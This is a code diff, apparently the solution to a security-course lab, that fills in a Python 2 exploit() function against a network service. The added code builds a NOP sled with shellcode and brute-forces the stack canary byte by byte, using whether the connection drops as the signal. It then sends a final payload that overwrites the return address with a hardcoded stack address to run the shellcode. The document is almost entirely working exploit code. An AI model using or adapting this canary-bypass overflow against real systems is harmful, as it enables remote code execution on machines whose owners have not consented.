@@ -35,13 +35,40 @@ def exploit(host, port, shellcode):
     # One useful function might be
     #   struct.pack("<I", x)
     # which returns the 4-byte binary encoding of the 32-bit integer x
+    BUFFER_SIZE = 2048
+    sploitstring = "\x90" * BUFFER_SIZE
+    sploitstring = sploitstring[:200] + shellcode + sploitstring[200+len(shellcode):]
+    try_char_int = 0
+    canary = ""
+    count = 0
     while True:
-        if try_exploit("hello world", host, port):
-            # Connection closed by server
-            continue
-        else:
-            # Connection still up
+        if count == 4:
             break
+        for i in xrange(0, 256):
+            if i == 10:
+                continue
+            try_char = struct.pack("<I", i)[:1]
+            cur_exploit = sploitstring + canary + try_char
+            print ":".join("{:x}".format(ord(c)) for c in canary + try_char)
+            print len(cur_exploit)
+            if try_exploit(cur_exploit, host, port):
+                # Connection closed by server
+                print "crashed"
+            else:
+                # Connection still up
+                print "works"
+                canary += try_char
+                count += 1
+                break
+    print ":".join("{:x}".format(ord(c)) for c in canary)
+    final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
+    print repr(final_exploit)
+    if try_exploit(final_exploit, host, port):
+        # Connection closed by server
+        print "crashed"
+    else:
+        # Connection still up
+        print "works"
 
 ####
 
